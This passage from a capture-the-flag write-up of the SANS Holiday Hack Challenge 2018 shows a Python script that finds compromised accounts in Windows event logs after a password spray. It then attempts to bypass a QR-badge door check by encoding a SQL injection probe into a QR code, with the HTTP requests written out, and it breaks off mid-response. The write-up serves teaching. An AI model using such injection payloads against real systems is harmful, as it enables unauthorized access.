&lt;span class="go"&gt;MM      KWMMMM               MMMM   MMMN               MMMMWK     KMM&lt;/span&gt;
&lt;span class="go"&gt;MMW KNMMMMMMMMK   WMMMW       NMM   MW        MMMMWK   MMMMMMMM  KWMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMW                            KWMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMW      WMMMMN       WMMMMN      MMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMN       K            K       KWMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMWKKWMMMMMMMMK   MMMMW        MM   MWK      KWMMMW    MMMMMMMMNKKMMM&lt;/span&gt;
&lt;span class="go"&gt;MM       WMMMM               MMMM   MMMN               MMMMWK     KMM&lt;/span&gt;
&lt;span class="go"&gt;MMMN        NMMW       NMK   NK       KK   WM       KWMM         NMMM&lt;/span&gt;
&lt;span class="go"&gt;MMWWMMWK              WMM                  WMM                MMMWMMM&lt;/span&gt;
&lt;span class="go"&gt;M      WMN      NMK   MMMN      M   W      MMM    NM       WMWK     M&lt;/span&gt;
&lt;span class="go"&gt;MW              MMN   MMMMMNMMMMM   MMMMWNMMMMW   WMM             KWM&lt;/span&gt;
&lt;span class="go"&gt;MMN       MM    MMMMMMMMMMMMMNK       KWMMMMMMMMMMMMM   KMM      KWMM&lt;/span&gt;
&lt;span class="go"&gt;M        KMM    MMMMMMMMMMMM             MMMMMMMMMMMM   KMM    K    M&lt;/span&gt;
&lt;span class="go"&gt;MWWMMM   KMM    MMMMMMMMMMMM    M   W   NMMMMMMMMMMMM   KMM    MMMWMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMNKKMMM    MMMMMMMMMMMMMMMN    KWMMMMMMMMMMMMMMM   KMMWKKWMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMM    MMMMMMMMMMMWK            MMMMMMMMMMMM   WMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMMMMMM                    NMMMMMMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMMMM        MMM   MMW       WMMMMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMMMMW  KWMMWK        WMMN  KMMMMMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMMMMMMMMMM             MMMMMMMMMMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMMMMMMMMMM    M   WK  NMMMMMMMMMMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM&lt;/span&gt;
&lt;span class="go"&gt;MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM&lt;/span&gt;

&lt;span class="go"&gt;Silly Minty Candycane, well this is what she gets.&lt;/span&gt;
&lt;span class="go"&gt;&amp;quot;Winter2018&amp;quot; isn&amp;#39;t for The Internets.&lt;/span&gt;
&lt;span class="go"&gt;Passwords formed with season-year are on the hackers&amp;#39; list.&lt;/span&gt;
&lt;span class="go"&gt;Maybe we should look at guidance published by the NIST?&lt;/span&gt;

&lt;span class="go"&gt;Congratulations!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To solve this challenge, we can also be a bit fancy, and use a Python script
to parse the XML file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;bs4&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Usage: {} &amp;lt;xml_event_file&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;# This set will hold every user without a FailureReason attribute&lt;/span&gt;
    &lt;span class="n"&gt;user_set_with_no_failure&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="c1"&gt;# The date of the spray attack was determined manually, by looking at the&lt;/span&gt;
    &lt;span class="c1"&gt;# date of the attack against aaron.smith&lt;/span&gt;
    &lt;span class="n"&gt;spray_attack_beginning&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strptime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2018-09-10 13:03:33&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;%Y-%m-&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s1"&gt; %H:%M:%S&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;# We open and parse the file&lt;/span&gt;
    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;soup&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;lxml&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;evt&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;soup&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;events&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find_all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;event&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="c1"&gt;# We check the date of every event.&lt;/span&gt;
        &lt;span class="c1"&gt;# If it&amp;#39;s before the attack, we don&amp;#39;t look at it&lt;/span&gt;
        &lt;span class="n"&gt;event_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;evt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timecreated&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;systemtime&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;event_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strptime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;event_time&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;%Y-%m-&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s1"&gt; %H:%M:%S&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;event_time&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;spray_attack_beginning&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;continue&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;evt_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;evt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;eventdata&lt;/span&gt;
            &lt;span class="c1"&gt;# If there&amp;#39;s no failure reason, we add our user to our result set.&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;evt_data&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find_all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;attrs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;FailureReason&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}):&lt;/span&gt;
                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;evt_data&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find_all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;attrs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;TargetUserName&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;}):&lt;/span&gt;
                    &lt;span class="n"&gt;user_set_with_no_failure&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;@EM.KRINGLECON.COM&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="c1"&gt;# We print our result set&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_set_with_no_failure&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./parse_xml.py ./ho-ho-no.xml
&lt;span class="go"&gt;HealthMailboxbe58608&lt;/span&gt;
&lt;span class="go"&gt;HealthMailboxbe58608d4925422d8e4ea458cfedc612&lt;/span&gt;
&lt;span class="go"&gt;SYSTEM&lt;/span&gt;
&lt;span class="go"&gt;WIN-KCON-EXCH16$&lt;/span&gt;
&lt;span class="go"&gt;HealthMailboxbab78a6&lt;/span&gt;
&lt;span class="go"&gt;wunorse.openslae&lt;/span&gt;
&lt;span class="go"&gt;minty.candycane&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Along with some users we don't care about, the script gives us
&lt;code&gt;minty.candycane&lt;/code&gt; and &lt;code&gt;wunorse.openslae&lt;/code&gt;. With some manual analysis
of the XML file, we can determine that the right user is
&lt;code&gt;minty.candycane&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="bypassing-the-door-authentication-mechanism"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id25"&gt;Bypassing the door authentication mechanism&lt;/a&gt;&lt;/h3&gt;
&lt;div class="section" id="the-haxxor-way"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id26"&gt;The &amp;quot;haXXor&amp;quot; way&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;We want to open &lt;a class="reference external" href="https://scanomatic.kringlecastle.com/index.html"&gt;the door next to Pepper Minstix&lt;/a&gt;, but we need a badge to do
so. The door needs to scan a QR code. It can do so by using your webcam (you
then need to click on the fingerprint reader), or you can upload a QR code
image using the USB dongle. Luckily for us, Alabaster Snowball lost his badge,
and we managed to get our hands on it:&lt;/p&gt;
&lt;img alt="alabaster_badge.png" class="align-center" src="/images/sans-christmas-challenge-2018/alabaster_badge.png" /&gt;
&lt;p&gt;If we try to scan this badge, we're told that the user was disabled. Probably
because the badge was lost.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/upload&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;scanomatic.kringlecastle.com&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json, text/javascript, */*; q=0.01&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;https://scanomatic.kringlecastle.com/index.html&lt;/span&gt;
&lt;span class="na"&gt;X-Requested-With&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;XMLHttpRequest&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;multipart/form-data; boundary=---------------------------5162445520959346741824970383&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;153774&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;resource_id=false&lt;/span&gt;

-----------------------------5162445520959346741824970383
Content-Disposition: form-data; name=&amp;quot;barcode&amp;quot;; filename=&amp;quot;alabaster_badge.png&amp;quot;
Content-Type: image/png

PNG [snip, content of the PNG file]
-----------------------------5162445520959346741824970383
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.3&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 03 Jan 2019 12:57:34 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;70&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;

&lt;span class="hll"&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Authorized User Account Has Been Disabled!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;img alt="scanomatic_user_disabled.gif" class="align-center" src="/images/sans-christmas-challenge-2018/scanomatic_user_disabled.gif" /&gt;
&lt;p&gt;So, we need to create our own badge. If we scan Alabaster's badge with a QR
code reader, we get &lt;code&gt;oRfjg5uGHmbduj2m&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;And this is where I lost sooooo much time&lt;/strong&gt;. For the purpose of completeness,
let's see all of my dead ends, yay! If you just want the solution, feel free to
&lt;a class="reference external" href="#the-right-solution"&gt;jump directly to it&lt;/a&gt;.&lt;/p&gt;
&lt;div class="section" id="all-the-dead-ends-yay"&gt;
&lt;h5&gt;&lt;a class="toc-backref" href="#id27"&gt;All the dead ends, yay!&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;The QR-encoded message looks like a base64-encoded string. Let's decode it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; -n oRfjg5uGHmbduj2m &lt;span class="p"&gt;|&lt;/span&gt; base64 -d &lt;span class="p"&gt;|&lt;/span&gt; hexdump -C
&lt;span class="go"&gt;00000000  a1 17 e3 83 9b 86 1e 66  dd ba 3d a6              |.......f..=.|&lt;/span&gt;
&lt;span class="go"&gt;0000000c&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This gives us a 12 byte identifier, &lt;code&gt;0xa117e3839b861e66ddba3da6&lt;/code&gt;. My
first idea was that, since we have to bypass authentication, let's try a SQL
injection in this id. However, I thought that, since the id &lt;strong&gt;seemed to be
base64-encoded&lt;/strong&gt;, I'd have to base64-encode my payload. Let's generate a QR
code with our SQL injection payload. I'm using the &lt;code&gt;qrtools&lt;/code&gt; Python
library:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;qrtools&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;qr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;qrtools&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QR&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;qr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;foo&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;#;-- &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;qr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sqli_detection.png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I'm first trying a simple payload, which just tries to break the SQL syntax.&lt;/p&gt;
&lt;p&gt;However, it did not work:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/upload&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;scanomatic.kringlecastle.com&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json, text/javascript, */*; q=0.01&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;https://scanomatic.kringlecastle.com/index.html&lt;/span&gt;
&lt;span class="na"&gt;X-Requested-With&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;XMLHttpRequest&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;multipart/form-data; boundary=---------------------------49127043815591531222123518543&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;580&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;resource_id=false&lt;/span&gt;

-----------------------------49127043815591531222123518543
Content-Disposition: form-data; name=&amp;quot;barcode&amp;quot;; filename=&amp;quot;sqli_detection.png&amp;quot;
Content-Type: image/png

PNG [snip]
-----------------------------49127043815591531222123518543
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.3&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 03 Jan 2019 13:09:43 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;61&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;

